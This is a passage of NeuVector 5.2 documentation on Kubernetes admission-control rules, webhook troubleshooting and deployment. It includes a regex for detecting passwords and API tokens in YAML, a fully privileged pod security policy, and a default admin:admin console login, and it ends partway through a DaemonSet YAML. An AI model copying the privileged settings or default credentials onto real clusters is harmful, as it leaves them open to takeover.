(e.g. CVE-2023-23914, 2023-23914, 23914, or unique text) where multiple are separated by comma’s. CVE score. Configure both the minimum score as well as the number of CVEs matching or exceeding the minimum CVSS score. Environment variables with secrets. If the deployment yaml or image scan result contains (or does not contain) any environment variables with secrets. See the criteria for secrets matching below. Environment variables. Use this to require or exclude certain environment variables in the deployment yaml or image scan. Image. Matching on specific image names, typically combined with other criteria for the rule. Image compliance violations. Matches if the image (registry) scan results in any compliance violations. See compliance for details on compliance checks. Image without OS information. Matches if the image (registry) scan results in the inability to retrieve OS information. Image registry. Matches on specific image registry names. Typically used to restrict deployments from certain registries or require deployments only from certain approved registries. Often used with other criteria such as namespaces. Image scanned. Require that an image be scanned. Often used to make sure all images are scanned to ensure that scan based criteria such as high CVEs can be applied to deployments. Image signed. Require that an image be signed through the integration of Sigstore/Cosign. This criteria simply checks whether there is any verifier in the scan result.Image Sigstore Verifiers. Require that an image be signed by a specific Sigstore root-of-trust name, as configured in Assets -&gt; Sigstore Verifiers. Checks whether the verifiers in the scan result match the verifiers in the rule configuration.Labels. Require that one or more labels be present in the deployment yaml or image scan results. Modules. Requires or excludes certain modules (packages, libraries) from being present in the image as the result of the image (registry) scan. Mount volumes. Typically used to prevent certain volumes from being mounted. Namespace. Allow or restrict deployments for certain namespace(s). Used independently but often combined with other criteria to limit the rule matching to namespace. PSP Best Practice. Equivalent rules for PSP (note: PSP is completely removed from kubernetes 1.25+, however this NeuVector equivalent may still used in 1.25+). Includes Run as privileged, Run as root, Share host's PID namespaces, Share host's IPC namespaces, Share host's Network, Allow Privilege Escalation. Resource Limit Configuration (RLC). Requires resource limits to be configured for CPU Limit/Request, Memory Limit/Request, and can require operator to be &gt; or &lt;= a configured resource value. Run as privileged. Typically used to limit or block deployments of privileged containers. Run as root. Typically used to limit or block deployments of containers run as root.. Service Account Bound High Risk Role. Can match on multiple criteria which could respresent a high risk service account role, including listing secrets, performing any operations on workloads, modification of RBAC resources, creation of workload resources, and allowing exec into a container. Share host’s IPC namespaces. Matches on IPC namespaces. Share host’s Network. Allow or disallow deployments to share the host’s network. Share host’s PID namespaces . Matches on PID namespaces. User. Allow or disallow defined users bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. User groups. Allow or disallow defined user groups bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. Violates PSA policy. Matches if the deployment violates either a Restricted or Baseline PSA Pod Security Standard (equivalent to PSA definitions in kubernetes 1.25+)   Secrets detection​  Detection of secrets, for example in environment variables is matched used the following regex:  Rule{Description: &quot;Password.in.YML&quot;, Expression: `(?i)(password|passwd|api_token)\\S{0,32}\\s*:\\s*(?-i)([0-9a-zA-Z\\/+]{16,40}\\b)`, ExprFName: `.*\\.ya?ml`, Tags: []string{share.SecretProgram, &quot;yaml&quot;, &quot;yml&quot;}, Suggestion: msgReferVender},   A list of types of secrets detected can be found here   ","version":"5.2","tagName":"h3"},{"title":"Admission Control Modes​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#admission-control-modes","content":" There are two modes NeuVector supports - Monitor and Protect.  Monitor: there is an alert message in the event log if a decision is denied. In this case, the cluster apiserver is allowed to create a resource successfully. Note: even if the rule action is Deny, in Monitor mode this will only alert.Protect: this is an inline protection mode. Once a decision is denied, the cluster resource will not be able to be created successfully, and an event will be logged.  ","version":"5.2","tagName":"h3"},{"title":"Admission Control Rules​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#admission-control-rules","content":" Rules can be Allow (whitelist) or Deny (blacklist) rules. Rules are evaluated in the order displayed, from top to bottom. Allow rules are evaluated first, and are useful to define exceptions (subsets) to Deny rules. If a resource deployment does not match any rules, the default action is to Allow the deployment.  There are two pre-configured rules which should be allowed to enable Kubernetes system container and NeuVector deployments.  Admission control rules apply to all resources which create pods (e.g. deployments, daemonsets, replicasets etc).  For admission control rules, the matching order is:  Default allow rules (e.g. system namespaces)Federated allow rules (if these exist)Federated deny rules (if these exist)CRD applied allow rules (if these exist)CRD applied deny rules (if these exist)User-defined allow rulesUser-defined deny rulesAllow the request if the request doesn't match any rule's criteria above  In each of the matching stages(1~7), the rule order doesn't matter. As long as the request matches one rule's criteria, the action (allow or deny) is taken and the request is allowed or denied.  ","version":"5.2","tagName":"h3"},{"title":"Federated Scan Results in Admission Control Rules​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#federated-scan-results-in-admission-control-rules","content":" The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage. See the multi-cluster section for more details.  ","version":"5.2","tagName":"h3"},{"title":"Configuring Sigstore/Cosign Verifiers for Requiring Image Signing​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#configuring-sigstorecosign-verifiers-for-requiring-image-signing","content":" Please see this section for configuring verifiers.  ","version":"5.2","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#troubleshooting","content":" If experiencing errors and you have access to the master node you can inspect the kube-apiserver log to search for admission webhook events. Examples:  W0406 13:16:49.012234 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission- webhook.neuvector.svc:443/v1/validate/1554514310852084622-1554514310852085078?timeout=30s: dial tcp: lookup neuvector-svc-admission-webhook.neuvector.svc on 8.8.8.8:53: no such host   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because it fails to resolve the neuvector-svc-admission-webhook.neuvector.svc name.  W0405 23:43:01.901346 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission-webhook.neuvector.svc:443/v1/validate/1554500399933067744-1554500399933068005?timeout=30s: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because it resolves the neuvector-svc-admission-webhook.neuvector.svc name with the wrong IP address. It could also indicate a network connectivity or firewall issue between api-server and the controller nodes.  W0406 01:14:48.200513 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.xyz.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.xyz.svc&quot;: Post https://neuvector-svc-admission- webhook.xyz.svc:443/v1/validate/1554500399933067744-1554500399933068005?timeout=30s: x509: certificate is valid for neuvector-svc-admission-webhook.neuvector.svc, not neuvector-svc-admission- webhook.xyz.svc   The above log indicates that the cluster kube-apiserver can send the request to the NeuVector webhook successfully but the certificate in caBundle is wrong.  W0404 23:27:15.270619 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission- webhook.neuvector.svc:443/v1/validate/1554384671766437200-1554384671766437404?timeout=30s: service &quot;neuvector-svc-admission-webhook&quot; not found   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because the neuvector-svc-admission-webhook service is not found.  Review Admission Control Configurations​  First, check your Kubernetes or OpenShift version. Admission control is supported in Kubernetes 1.9+ and OpenShift 3.9+. For OpenShift, make sure you have edited the master-config.yaml to add the MutatingAdmissionWebhook configuration and restarted the master api-servers.  Check the Clusterrole  kubectl get clusterrole neuvector-binding-admission -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;delete&quot;   Then check:  kubectl get clusterrole neuvector-binding-app -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;   If the above verbs are not listed, the Test button will fail.  Check the Clusterrolebinding  kubectl get clusterrolebinding neuvector-binding-admission -o json   Make sure the ServiceAccount is set properly:  &quot;subjects&quot;: [ { &quot;kind&quot;: &quot;ServiceAccount&quot;, &quot;name&quot;: &quot;default&quot;, &quot;namespace&quot;: &quot;neuvector&quot;   Check the Webhook Configuration  kubectl get ValidatingWebhookConfiguration --as system:serviceaccount:neuvector:default -o yaml &gt; nv_validation.txt   The nv_validation.txt should have similar content to:  apiVersion: v1 items: - apiVersion: admissionregistration.k8s.io/v1beta1 kind: ValidatingWebhookConfiguration metadata: creationTimestamp: &quot;2019-09-11T00:51:08Z&quot; generation: 1 name: neuvector-validating-admission-webhook resourceVersion: &quot;6859045&quot; selfLink: /apis/admissionregistration.k8s.io/v1beta1/validatingwebhookconfigurations/neuvector-validating-admission-webhook uid: 3e1793ed-d42e-11e9-ba43-000c290f9e12 webhooks: - admissionReviewVersions: - v1beta1 clientConfig: caBundle: {.........................} service: name: neuvector-svc-admission-webhook namespace: neuvector path: /v1/validate/{.........................} failurePolicy: Ignore name: neuvector-validating-admission-webhook.neuvector.svc namespaceSelector: {} rules: - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - CREATE resources: - cronjobs - daemonsets - deployments - jobs - pods - replicasets - replicationcontrollers - services - statefulsets scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - UPDATE resources: - daemonsets - deployments - replicationcontrollers - statefulsets - services scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - DELETE resources: - daemonsets - deployments - services - statefulsets scope: '*' sideEffects: Unknown timeoutSeconds: 30 kind: List metadata: resourceVersion: &quot;&quot; selfLink: &quot;&quot;   If you see any content like &quot;Error from server ....&quot; or &quot;... is forbidden&quot;, it means the NV controller service account doesn't have access right for ValidatingWebhookConfiguration resource. In this case it usually means the neuvector-binding-admission clusterrole/clusterrolebinding has some issue. Deleting and recreating neuvector-binding-admission clusterrole/clusterrolebinding usually the fastest fix.  Test the Admission Control Connection Button  In the NeuVector Console in Policy -&gt; Admission Control, go to More Operations -&gt; Advanced Setting and click the &quot;Test&quot; button. NeuVector will modify service neuvector-svc-admission-webhook and see if our webhook server can receive the change notifification or if it fails.  Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like:  apiVersion: v1 kind: Service metadata: annotations: ................... creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment tag-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment name: neuvector-svc-admission-webhook namespace: neuvector ................... spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   Now click admission control's advanced setting =&gt; &quot;Test&quot; button. Wait until it shows success or failure. NeuVector will modify the service neuvector-svc-admission-webhook's tag-neuvector-svc-admission-webhook label implicitly. Wait for controller internal operation. If the NeuVector webhook server receives update request from kube-apiserver about this service change, NeuVector will modify the service neuvector-svc-admission-webhook's echo-neuvector-svc-admission-webhook label to the same value as tag-neuvector-svc-admission-webhook label. Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like   apiVersion: v1 kind: Service metadata: annotations: ............. creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568225712&quot; //===&gt; changed in step 3-3 after receiving request from kube-apiserver tag-neuvector-svc-admission-webhook: &quot;1568225712&quot; //===&gt; changed in step 3-2 because of UI operation name: neuvector-svc-admission-webhook namespace: neuvector ................. spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   After the test, if the value of label tag-neuvector-svc-admission-webhook doesn't change, it means the controller service fails to update neuvector-svc-admission-webhook service. Check if neuvector-binding-app clusterrole/clusterrolebinding are configured correctly. After the test, if the value of label tag-neuvector-svc-admission-webhook is changed but not the value of label echo-neuvector-svc-admission-webhook, it means the webhook server didn't receive the request from the kube-apiserver. The kub-apiserver's request can't reach the NeuVector webhook server. The cause of this could be network connectivity issues, firewalls blocking the request (on default port 443 in), the resolving of the wrong IP for the controller or others. ","version":"5.2","tagName":"h3"},{"title":"Configuration Assessment for Kubernetes Resources","type":0,"sectionRef":"#","url":"/5.2/policy/admission/assessment","content":"","keywords":"","version":"5.2"},{"title":"Kubernetes Resource Deployment File Scanning​","type":1,"pageTitle":"Configuration Assessment for Kubernetes Resources","url":"/5.2/policy/admission/assessment#kubernetes-resource-deployment-file-scanning","content":" NeuVector is able to scan deployment yaml files for configuration assessments against Admission Control rules. This is useful to scan deployment yaml files early in the pipeline to determine if the deployment would violate any rules before attempting the deployment.  To upload a yaml file to be scanned, go to Policy -&gt; Admission Control and click the Configuration Assessment button. In the window, select a file to upload, then Test.    You will then see an analysis of the file, whether the deployment would be allowed, and messages for rules that would apply to the deployment file. ","version":"5.2","tagName":"h3"},{"title":"Kubernetes","type":0,"sectionRef":"#","url":"/5.2/deploying/kubernetes","content":"","keywords":"","version":"5.2"},{"title":"Deploy Using Kubernetes​","type":1,"pageTitle":"Kubernetes","url":"/5.2/deploying/kubernetes#deploy-using-kubernetes","content":" You can use Kubernetes to deploy separate manager, controller and enforcer containers and make sure that all new nodes have an enforcer deployed. NeuVector requires and supports Kubernetes network plugins such as flannel, weave, or calico.  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node as a daemonset. By default, the yaml sample below will deploy to the Master node as well.  See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues. If you plan to use a PersistentVolume claim to store the backup of NeuVector config files, please see the general Backup/Persistent Data section in the Deploying NeuVector overview.  If your deployment supports an integrated load balancer, change type NodePort to LoadBalancer for the console in the yaml file below.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  There is a separate section for OpenShift instructions, and Docker EE on Kubernetes has some special steps described in the Docker section.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.2.0neuvector/controller:5.2.0neuvector/enforcer:5.2.0neuvector/scanner:latestneuvector/updater:latest  Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml:  Update the registry to docker.ioUpdate image names/tags to the current version on Docker hub, as shown aboveLeave the imagePullSecrets empty  note If deploying from the Rancher Manager 2.6.5+ NeuVector chart, images are pulled automatically from the Rancher NeuVector mirrored image repo, and deploys into the cattle-neuvector-system namespace.  ","version":"5.2","tagName":"h3"},{"title":"Deploy NeuVector​","type":1,"pageTitle":"Kubernetes","url":"/5.2/deploying/kubernetes#deploy-neuvector","content":" Create the NeuVector namespace and the required service accounts: kubectl create namespace neuvector kubectl create sa controller -n neuvector kubectl create sa enforcer -n neuvector kubectl create sa basic -n neuvector kubectl create sa updater -n neuvector (Optional) Create the NeuVector Pod Security Admission (PSA) or Pod Security Policy (PSP). If you have enabled Pod Security Admission (aka Pod Security Standards) in Kubernetes 1.25+, or Pod Security Policies (prior to 1.25) in your Kubernetes cluster, add the following for NeuVector (for example, nv_psp.yaml). Note1: PSP is deprecated in Kubernetes 1.21 and will be totally removed in 1.25. Note2: The Manager and Scanner pods run without a uid. If your PSP has a rule Run As User: Rule: MustRunAsNonRoot then add the following into the sample yaml below (with appropriate value for ###): securityContext: runAsUser: ### For PSA in Kubernetes 1.25+, label the NeuVector namespace with privileged profile for deploying on a PSA enabled cluster. kubectl label namespace neuvector &quot;pod-security.kubernetes.io/enforce=privileged&quot; View Sample NeuVector PSP (1.24 and earlier) apiVersion: policy/v1beta1 kind: PodSecurityPolicy metadata: name: neuvector-binding-psp annotations: seccomp.security.alpha.kubernetes.io/allowedProfileNames: '*' spec: privileged: true readOnlyRootFilesystem: false allowPrivilegeEscalation: true allowedCapabilities: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK requiredDropCapabilities: - ALL volumes: - '*' hostNetwork: true hostPorts: - min: 0 max: 65535 hostIPC: true hostPID: true runAsUser: rule: 'RunAsAny' seLinux: rule: 'RunAsAny' supplementalGroups: rule: 'RunAsAny' fsGroup: rule: 'RunAsAny' --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: neuvector-binding-psp namespace: neuvector rules: - apiGroups: - policy - extensions resources: - podsecuritypolicies verbs: - use resourceNames: - neuvector-binding-psp --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: neuvector-binding-psp namespace: neuvector roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: neuvector-binding-psp subjects: - kind: ServiceAccount name: controller namespace: neuvector - kind: ServiceAccount name: enforcer namespace: neuvector Then create the PSP kubectl create -f nv_psp.yaml Create the custom resources (CRD) for NeuVector security rules. For Kubernetes 1.19+: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/admission-crd-k8s-1.19.yaml Add read permission to access the kubernetes API. important The standard NeuVector 5.2+ deployment uses least-privileged service accounts instead of the default. See below if upgrading to 5.2+ from a version prior to 5.2. kubectl create clusterrole neuvector-binding-app --verb=get,list,watch,update --resource=nodes,pods,services,namespaces kubectl create clusterrole neuvector-binding-rbac --verb=get,list,watch --resource=rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io kubectl create clusterrolebinding neuvector-binding-app --clusterrole=neuvector-binding-app --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-rbac --clusterrole=neuvector-binding-rbac --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-admission --verb=get,list,watch,create,update,delete --resource=validatingwebhookconfigurations,mutatingwebhookconfigurations kubectl create clusterrolebinding neuvector-binding-admission --clusterrole=neuvector-binding-admission --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions kubectl create clusterrolebinding neuvector-binding-customresourcedefinition --clusterrole=neuvector-binding-customresourcedefinition --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvsecurityrules --verb=list,delete --resource=nvsecurityrules,nvclustersecurityrules kubectl create clusterrolebinding neuvector-binding-nvsecurityrules --clusterrole=neuvector-binding-nvsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:controller kubectl create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector kubectl create rolebinding neuvector-binding-scanner --role=neuvector-binding-scanner --serviceaccount=neuvector:updater --serviceaccount=neuvector:controller -n neuvector kubectl create clusterrole neuvector-binding-csp-usages --verb=get,create,update,delete --resource=cspadapterusagerecords kubectl create clusterrolebinding neuvector-binding-csp-usages --clusterrole=neuvector-binding-csp-usages --serviceaccount=neuvector:controller note If upgrading NeuVector from a previous install, you will need to delete the old binding before creating the new least-privileged bindings: kubectl delete clusterrolebinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules kubectl delete rolebinding neuvector-admin -n neuvector kubectl create clusterrolebinding neuvector-binding-app --clusterrole=neuvector-binding-app --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-rbac --clusterrole=neuvector-binding-rbac --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-admission --clusterrole=neuvector-binding-admission --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-customresourcedefinition --clusterrole=neuvector-binding-customresourcedefinition --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvsecurityrules --clusterrole=neuvector-binding-nvsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:controller kubectl create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector kubectl create rolebinding neuvector-binding-scanner --role=neuvector-binding-scanner --serviceaccount=neuvector:updater --serviceaccount=neuvector:controller -n neuvector kubectl create clusterrole neuvector-binding-csp-usages --verb=get,create,update,delete --resource=cspadapterusagerecords kubectl create clusterrolebinding neuvector-binding-csp-usages --clusterrole=neuvector-binding-csp-usages --serviceaccount=neuvector:controller Run the following commands to check if the neuvector/controller and neuvector/updater service accounts are added successfully. kubectl get ClusterRoleBinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-csp-usages -o wide Sample output: NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-app ClusterRole/neuvector-binding-app 56d neuvector/controller neuvector-binding-rbac ClusterRole/neuvector-binding-rbac 34d neuvector/controller neuvector-binding-admission ClusterRole/neuvector-binding-admission 72d neuvector/controller neuvector-binding-customresourcedefinition ClusterRole/neuvector-binding-customresourcedefinition 72d neuvector/controller neuvector-binding-nvsecurityrules ClusterRole/neuvector-binding-nvsecurityrules 72d neuvector/controller neuvector-binding-view ClusterRole/view 72d neuvector/controller neuvector-binding-nvwafsecurityrules ClusterRole/neuvector-binding-nvwafsecurityrules 72d neuvector/controller neuvector-binding-nvadmissioncontrolsecurityrules ClusterRole/neuvector-binding-nvadmissioncontrolsecurityrules 72d neuvector/controller neuvector-binding-nvdlpsecurityrules ClusterRole/neuvector-binding-nvdlpsecurityrules 72d neuvector/controller neuvector-binding-csp-usages ClusterRole/neuvector-binding-csp-usages 24d neuvector/controller And this command: kubectl get RoleBinding neuvector-binding-scanner -n neuvector -o wide Sample output: NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-scanner Role/neuvector-binding-scanner 70d neuvector/updater, neuvector/controller (Optional) Create the Federation Master and/or Remote Multi-Cluster Management Services. If you plan to use the multi-cluster management functions in NeuVector, one cluster must have the Federation Master service deployed, and each remote cluster must have the Federation Worker service. For flexibility, you may choose to deploy both Master and Worker services on each cluster so any cluster can be a master or remote. View Multi-Cluster Management Services apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-master namespace: neuvector spec: ports: - port: 11443 name: fed protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-worker namespace: neuvector spec: ports: - port: 10443 name: fed protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod Then create the appropriate service(s): kubectl create -f nv_master_worker.yaml Create the primary NeuVector services and pods using the preset version commands or modify the sample yamls below. The preset versions invoke a LoadBalancer for the NeuVector Console. If using the sample yaml files below replace the image names and &lt;version&gt; tags for the manager, controller and enforcer image references in the yaml file. Also make any other modifications required for your deployment environment (such as LoadBalancer/NodePort/Ingress for manager access etc). For general containerd runtime (non Rancher/K3s) kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-containerd-k8s.yaml For 5.2.0 with Rancher on K3s containerd run-time: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-rancher-containerd-k3s.yaml For 5.2.0 with docker run-time: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-docker-k8s.yaml For 5.2.0 with AWS Bottlerocket run-time: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-aws-bottlerocket-k8s.yaml Or, if modifying any of the above yaml or samples from below: kubectl create -f neuvector.yaml That's it! You should be able to connect to the NeuVector console and login with admin:admin, e.g. https://&lt;public-ip&gt;:8443  note The nodeport service specified in the neuvector.yaml file will open a random port on all kubernetes nodes for the NeuVector management web console port. Alternatively, you can use a LoadBalancer or Ingress, using a public IP and default port 8443. For nodeport, be sure to open access through firewalls for that port, if needed. If you want to see which port is open on the host nodes, please do the following commands: kubectl get svc -n neuvector And you will see something like: NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE neuvector-service-webui 10.100.195.99 &lt;nodes&gt; 8443:30257/TCP 15m If you have created your own namespace instead of using “neuvector”, replace all instances of “namespace: neuvector” and other namespace references with your namespace in the sample yaml files below.  ","version":"5.2","tagName":"h3"},{"title":"Kubernetes Deployment Examples for NeuVector","type":1,"pageTitle":"Kubernetes","url":"/5.2/deploying/kubernetes##","content":" Kubernetes v1.19-1.27 with containerd Run-time apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: LoadBalancer selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.2.0 env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: neuvector/controller:5.2.0 securityContext: privileged: true readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /var/neuvector name: nv-share readOnly: false - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: - name: nv-share hostPath: path: /var/neuvector - name: runtime-sock hostPath: path: /run/containerd/containerd.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate 